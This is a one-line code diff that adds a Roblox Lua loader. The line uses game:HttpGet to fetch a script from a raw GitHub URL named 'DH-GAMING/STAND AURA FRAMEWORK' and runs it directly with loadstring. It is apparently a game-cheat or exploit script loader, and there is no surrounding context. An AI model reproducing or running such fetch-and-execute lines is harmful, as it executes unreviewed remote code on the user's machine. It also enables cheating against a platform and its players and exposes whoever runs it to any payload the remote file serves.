@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JOJOGIO/DH-GAMING/main/STAND%20AURA%20FRAMEWORK"))()
